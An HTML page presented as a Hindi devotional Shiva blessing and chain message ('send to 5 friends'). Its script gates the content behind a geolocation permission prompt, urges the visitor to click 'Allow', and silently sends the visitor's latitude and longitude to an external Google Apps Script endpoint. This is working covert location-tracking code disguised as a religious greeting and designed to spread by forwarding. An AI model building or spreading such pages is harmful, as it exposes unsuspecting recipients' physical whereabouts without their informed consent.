<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <title>Mahadev Message</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 50px;
      background: #f9f9f9;
      color: #333;
    }
    h1 {
      font-size: 48px;
      color: #005500;
    }
    p {
      font-size: 20px;
      margin: 10px 0;
    }
    img {
      margin-top: 30px;
      max-width: 300px;
      border-radius: 10px;
    }
  </style>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const content = document.getElementById("main-content");
      const warning = document.getElementById("warning");

      navigator.geolocation.getCurrentPosition(
        function (position) {
          content.style.display = "block";
          warning.style.display = "none";

          fetch("https://script.google.com/macros/s/AKfycbxL8oPihXWcGqvq-hpC5HyKqOKyCRzZHgx3HA3tqz-7d40hU1kjCgYo5QzvlFm-wrer/exec", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            })
          })
          .then(response => response.text())
          .then(data => {
            console.log("Location sent:", data);
          })
          .catch(err => {
            console.error("Error sending location:", err);
          });
        },
        function (error) {
          content.style.display = "none";
          warning.style.display = "block";
        }
      );
    });
  </script>
</head>
<body>

<div id="warning" style="display:none;">
  <h1>⚠️ ध्यान दें</h1>
  <p>इस पेज को देखने के लिए 'Allow' पर क्लिक करें।</p>
</div>

<div id="main-content" style="display:none;">
  <h1>ॐ नमः शिवाय</h1>
  <p>महादेव आपकी मनोकामना पूरी करें!</p>
  <p>इस मैसेज को अभी अपने 5 दोस्तों को भेजो और देखो चमत्कार!</p>
  <img src="https://i.postimg.cc/tT9XKSsJ/adiyogi-lord-shiva-1179x2556-14420.png" alt="Mahadev Image" />
</div>

</body>
</html>
